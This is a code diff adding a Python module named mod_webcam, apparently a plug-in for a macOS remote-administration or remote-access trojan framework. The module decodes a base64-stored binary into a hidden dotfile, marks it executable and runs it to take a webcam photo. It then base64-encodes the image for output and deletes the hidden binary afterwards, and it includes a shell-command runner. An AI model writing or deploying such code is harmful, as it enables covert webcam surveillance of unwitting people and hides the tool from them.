@@ -1,0 +1,42 @@
+# from modInterface import ReMacModInterface
+import subprocess
+import os
+import base64
+
+class mod_webcam():
+    def __init__(self):
+        self.setup_mod()
+
+    def setup_mod(self):
+        print(f'Module Setup (mod_webcam) called successfully!')
+        pass
+
+    def run_command(self, command):
+        out, err = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+        return out + err
+
+    def run_mod(self):
+        print(f'Webcam Module')
+        content_encoding = "utf-8"
+        cur_dir = os.path.abspath(".")
+        print(f'{cur_dir}')
+        base64ToolFile = open(f'{cur_dir}/tools/wc_tool', 'rb')
+        base64ToolContent = base64ToolFile.read()
+
+        wc_tool_bin = f"{cur_dir}/tools/.wc_tool_bin"
+        wc_img = "wc_tmp.png"
+        with open(wc_tool_bin, "wb") as output_file:
+            output_file.write(base64.b64decode(base64ToolContent))
+            self.run_command(f"chmod a+x {wc_tool_bin}")
+
+        print(self.run_command(f'{wc_tool_bin} {wc_img}'))
+
+        image = open(f'{wc_img}', 'rb')
+        image_read = image.read()
+        image_64_encode = base64.encodebytes(image_read)
+        print(f'Image-Base64: {image_64_encode}')
+        answer = "Photo (webcam) taken"
+        print(answer)
+        os.remove(wc_tool_bin)
+
+        pass
